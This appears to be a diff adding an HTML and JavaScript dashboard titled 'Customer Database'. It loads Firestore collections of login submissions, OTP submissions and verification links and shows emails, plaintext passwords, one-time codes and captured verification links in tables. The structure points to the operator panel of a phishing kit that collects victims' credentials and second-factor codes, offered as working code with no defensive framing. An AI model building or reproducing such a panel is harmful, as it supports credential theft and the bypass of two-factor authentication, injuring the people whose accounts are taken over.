@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8">
+
+<meta name="viewport" content="width=device-width,initial-scale=1">
+
+<title>Customer Database</title>
+
+<style>
+
+*{
+
+margin:0;
+
+padding:0;
+
+box-sizing:border-box;
+
+font-family:Arial,Helvetica,sans-serif;
+
+}
+
+body{
+
+background:#f5f7fb;
+
+padding:30px;
+
+}
+
+h1{
+
+margin-bottom:25px;
+
+color:#1f2937;
+
+}
+
+.section{
+
+background:#fff;
+
+padding:20px;
+
+border-radius:12px;
+
+margin-bottom:30px;
+
+box-shadow:0 5px 15px rgba(0,0,0,.08);
+
+}
+
+.section h2{
+
+margin-bottom:15px;
+
+color:#2563eb;
+
+}
+
+table{
+
+width:100%;
+
+border-collapse:collapse;
+
+}
+
+th{
+
+background:#2563eb;
+
+color:#fff;
+
+padding:12px;
+
+text-align:left;
+
+}
+
+td{
+
+padding:12px;
+
+border-bottom:1px solid #ddd;
+
+vertical-align:top;
+
+word-break:break-word;
+
+}
+
+tr:nth-child(even){
+
+background:#f8fafc;
+
+}
+
+.status{
+
+display:inline-block;
+
+padding:5px 12px;
+
+border-radius:20px;
+
+background:#f59e0b;
+
+color:white;
+
+font-size:13px;
+
+font-weight:bold;
+
+}
+
+</style>
+
+</head>
+
+<body>
+
+<h1>
+
+Customer Database
+
+</h1>
+
+<div class="section">
+
+<h2>
+
+Login Submissions
+
+</h2>
+
+<table>
+
+<thead>
+
+<tr>
+
+<th>Email</th>
+
+<th>Password</th>
+
+<th>Status</th>
+
+<th>Date</th>
+
+</tr>
+
+</thead>
+
+<tbody id="loginTable">
+
+</tbody>
+
+</table>
+
+</div>
+
+<div class="section">
+
+<h2>
+
+OTP Submissions
+
+</h2>
+
+<table>
+
+<thead>
+
+<tr>
+
+<th>Email</th>
+
+<th>OTP</th>
+
+<th>Attempt</th>
+
+<th>Date</th>
+
+</tr>
+
+</thead>
+
+<tbody id="otpTable">
+
+</tbody>
+
+</table>
+
+</div>
+
+<div class="section">
+
+<h2>
+
+Verification Links
+
+</h2>
+
+<table>
+
+<thead>
+
+<tr>
+
+<th>Email</th>
+
+<th>Verification Link</th>
+
+<th>Status</th>
+
+<th>Date</th>
+
+</tr>
+
+</thead>
+
+<tbody id="verificationTable">
+
+</tbody>
+
+</table>
+
+</div>
+<script type="module">
+
+import { db } from "./js/firebase.js";
+
+import {
+
+collection,
+
+getDocs,
+
+query,
+
+orderBy
+
+}
+
+from "https://www.gstatic.com/firebasejs/12.1.0/firebase-firestore.js";
+
+// ---------------- LOGIN ----------------
+
+const loginTable =
+document.getElementById("loginTable");
+
+const loginSnapshot =
+await getDocs(
+
+query(
+
+collection(db,"login_submissions"),
+
+orderBy("createdAt","desc")
+
+)
+
+);
+
+loginSnapshot.forEach(doc=>{
+
+const data=doc.data();
+
+const row=`
+
+<tr>
+
+<td>${data.email||""}</td>
+
+<td>${data.password||""}</td>
+
+<td><span class="status">${data.status||""}</span></td>
+
+<td>${
+data.createdAt
+? data.createdAt.toDate().toLocaleString()
+: ""
+}</td>
+
+</tr>
+
+`;
+
+loginTable.innerHTML+=row;
+
+});
+
+// ---------------- OTP ----------------
+
+const otpTable =
+document.getElementById("otpTable");
+
+const otpSnapshot =
+await getDocs(
+
+query(
+
+collection(db,"otp_submissions"),
+
+orderBy("createdAt","desc")
+
+)
+
+);
+
+otpSnapshot.forEach(doc=>{
+
+const data=doc.data();
+
+const row=`
+
+<tr>
+
+<td>${data.email||""}</td>
+
+<td>${data.otp||""}</td>
+
+<td>${data.attempt||""}</td>
+
+<td>${
+data.createdAt
+? data.createdAt.toDate().toLocaleString()
+: ""
+}</td>
+
+</tr>
+
+`;
+
+otpTable.innerHTML+=row;
+
+});
+
+// ---------------- VERIFICATION ----------------
+
+const verificationTable =
+document.getElementById("verificationTable");
+
+const verificationSnapshot =
+await getDocs(
+
+query(
+
+collection(db,"verification_submissions"),
+
+orderBy("createdAt","desc")
+
+)
+
+);
+
+verificationSnapshot.forEach(doc=>{
+
+const data=doc.data();
+
+const row=`
+
+<tr>
+
+<td>${data.email||""}</td>
+
+<td style="max-width:350px;word-break:break-word;">
+${data.verificationLink||""}
+</td>
+
+<td>
+<span class="status">
+${data.status||""}
+</span>
+</td>
+
+<td>${
+data.createdAt
+? data.createdAt.toDate().toLocaleString()
+: ""
+}</td>
+
+</tr>
+
+`;
+
+verificationTable.innerHTML+=row;
+
+});
+
+</script>
+
+</body>
+
+</html>
